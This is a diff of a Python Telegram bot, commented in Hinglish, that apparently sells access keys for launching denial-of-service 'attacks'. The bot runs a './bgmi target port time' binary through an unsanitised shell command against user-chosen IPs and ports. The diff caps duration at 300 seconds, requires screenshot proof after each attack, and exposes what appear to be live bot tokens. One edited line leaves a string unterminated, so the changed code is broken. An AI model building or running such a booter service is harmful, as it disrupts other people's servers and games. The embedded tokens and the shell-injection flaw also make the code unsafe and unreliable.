@@ -9,22 +9,22 @@ import string
 from telebot import types
 
 # TELEGRAM BOT TOKEN
-bot = telebot.TeleBot('7973805250:AAE1umqUG8ZhI5Ev0FQe5w-NmkdDtI-dXBs')
+bot = telebot.TeleBot('7973805250:AAFLEfGYS5LCw2aavYxu3oojp01M1pOmleY')
 
 # GROUP AND CHANNEL DETAILS
 GROUP_ID = "-1002252633433"
-CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
+CHANNEL_USERNAME = "@KHAPITAR_BALAK77
 SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
-ADMINS = [7129010361]
+ADMINS = [7129010361]  # Admin IDs
 
 # GLOBAL VARIABLES
 pending_feedback = {}
 warn_count = {}
 attack_logs = []
 user_attack_count = {}
-keys = {}  # Store generated keys with expiry dates
-redeemed_users = {}  # Store redeemed users with expiry
-active_attacks = []  # Track active attacks
+keys = {}
+redeemed_users = {}
+active_attacks = []
 
 # FUNCTION TO CHECK IF USER IS IN CHANNEL
 def is_user_in_channel(user_id):
@@ -82,7 +82,7 @@ def redeem_key(message):
         del keys[key]
         return
 
-    redeemed_users[user_id] = keys[key]  # Store user with expiry date
+    redeemed_users[user_id] = keys[key]
     del keys[key]
 
     bot.reply_to(message, "🎉 SUCCESSFULLY REDEEMED! AB TU UNLIMITED ATTACK KAR SAKTA HAI 🚀", parse_mode="Markdown")
@@ -104,7 +104,7 @@ def my_info(message):
 
     bot.reply_to(message, info_msg, parse_mode="Markdown")
 
-# HANDLE ATTACK COMMAND (UNLIMITED ATTACKS ENABLED)
+# HANDLE ATTACK COMMAND
 @bot.message_handler(commands=['RS'])
 def handle_attack(message):
     user_id = message.from_user.id
@@ -139,21 +139,21 @@ def handle_attack(message):
         bot.reply_to(message, "❌ PORT AUR TIME NUMBER HONE CHAHIYE!")
         return
 
-    if time_duration > 500:
-        bot.reply_to(message, "🚫 700S SE ZYADA ALLOWED NAHI HAI!")
+    if time_duration > 300:
+        bot.reply_to(message, "🚫 300S SE ZYADA ALLOWED NAHI HAI!")
         return
 
     confirm_msg = f"🔥 ATTACK DETAILS:\n🎯 TARGET: `{target}`\n🔢 PORT: `{port}`\n⏳ DURATION: `{time_duration}S`\nSTATUS: `CHAL RAHA HAI...`\n📸 ATTACK KE BAAD SCREENSHOT BHEJNA ZAROORI HAI!"
 
     bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")
 
-    # ADD ATTACK TO ACTIVE LIST
     attack_info = {"user_id": user_id, "target": target, "port": port, "time": time_duration}
     active_attacks.append(attack_info)
 
-    user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1  # Update attack count
+    user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1
 
-    # ATTACK EXECUTION
+    pending_feedback[user_id] = True  # Screenshot mandatory
+
     def attack_execution():
         try:
             subprocess.run(f"./bgmi {target} {port} {time_duration} 100", shell=True, check=True, timeout=time_duration)
@@ -167,7 +167,21 @@ def handle_attack(message):
 
     threading.Thread(target=attack_execution).start()
 
-# /CHECK COMMAND TO SEE ACTIVE ATTACKS
+# HANDLE SCREENSHOT VERIFICATION
+@bot.message_handler(content_types=['photo'])
+def handle_screenshot(message):
+    user_id = message.from_user.id
+
+    if user_id not in pending_feedback:
+        bot.reply_to(message, "❌ TERA KOI PENDING ATTACK NAHI HAI! BAKCHODI BAND KAR!")
+        return
+
+    bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
+    del pending_feedback[user_id]
+
+    bot.reply_to(message, "✅ SCREENSHOT VERIFY HO GAYA! AB TU NAYA ATTACK KAR SAKTA HAI 🔥")
+
+# /CHECK COMMAND
 @bot.message_handler(commands=['check'])
 def check_attacks(message):
     if not active_attacks:
@@ -180,5 +194,5 @@ def check_attacks(message):
 
     bot.send_message(message.chat.id, check_msg, parse_mode="Markdown")
 
-# START POLLING
+# START BOT
 bot.polling(none_stop=True)
